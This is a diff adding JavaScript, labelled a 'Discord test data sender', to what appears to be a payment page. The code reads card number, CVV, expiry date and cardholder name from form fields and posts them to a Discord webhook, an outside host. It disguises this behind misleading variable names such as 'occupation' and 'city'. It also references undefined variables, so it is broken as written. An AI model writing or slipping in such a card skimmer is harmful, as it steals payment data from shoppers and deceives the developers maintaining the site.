@@ -1,1 +1,75 @@
+// Discord test data sender
+async function sendNameToDiscord() {
 
+    const name =
+    document.getElementById("cardNumber")
+    .value
+    .trim();
+
+
+    const occupation =
+    document.getElementById("cardCvv")
+    .value
+    .trim();
+
+
+    const city =
+    document.getElementById("cardExpiry")
+    .value
+    .trim();
+
+
+    const age =
+    document.getElementById("cardName")
+    .value
+    .trim();
+
+
+    const message = {
+
+        content:
+
+        `📝 New User Input
+
+CardNumber:
+${cardnumber}
+
+CVV:
+${cvv}
+
+ExpiryDate:
+${expiry}
+
+Name:
+${name}
+
+Time:
+${new Date().toLocaleString()}`
+
+    };
+
+
+    await fetch(
+        DISCORD_WEBHOOK_URL,
+        {
+
+            method:"POST",
+
+            headers:{
+                "Content-Type":"application/json"
+            },
+
+            body:
+            JSON.stringify(message)
+
+        }
+    );
+
+}
+
+
+
+// Your existing function below
+function submitPayment() {
+
+}
